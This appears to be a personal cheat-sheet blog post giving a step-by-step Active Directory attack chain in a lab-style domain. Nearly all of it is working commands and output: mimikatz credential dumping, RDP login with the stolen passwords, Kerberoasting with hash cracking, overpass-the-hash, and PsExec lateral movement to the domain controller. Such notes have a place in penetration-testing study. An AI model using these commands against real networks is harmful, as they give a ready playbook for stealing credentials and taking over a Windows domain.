---
layout: post
title:  "ad - general"
date:   2022-01-01
categories: windows
---


# ad - scenario 1

- run mimikatz

```bash
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords

    kerberos :
         * Username : admin
         * Domain   : example.local
         * Password : easypass123
```

- connect using xfreerdp

```bash
xfreerdp /v:10.10.10.10 /u:admin /p:easypass123 /d:example.local  /dynamic-resolution +toggle-fullscreen
```

- upload and running rerberoast using powershell

```bash
Invoke-Kerberoast -OutputFormat john | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```

- crack the collected tickets

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.kerberoast                         

hardpass!         (omni_admin)
```


- login as omni_admin

```bash
xfreerdp /v:10.10.10.10 /u:omni_admin /p:'hardpass!' /d:example.local /drive:share,/home/kali/Desktop  /dynamic-resolution +toggle-fullscreen
```


## collect more hashes using mimikatz.exe

```bash
mimikatz.exe
privilege::debug
token::elevate
sekurlsa:logonpasswords

* Username : Administrator
         * Domain   : paragraph1
         * NTLM     : <ntml>
```

## overpass the hash


```bash
mimikatz.exe
privilege::debug
token::elevate
sekurlsa::pth /user:Administrator /domain:example.local /ntlm:<ntml> /run:PowerShell.exe
```

## psexec dc lateral movement

```
.\PsExec64.exe \\dc cmd.exe
```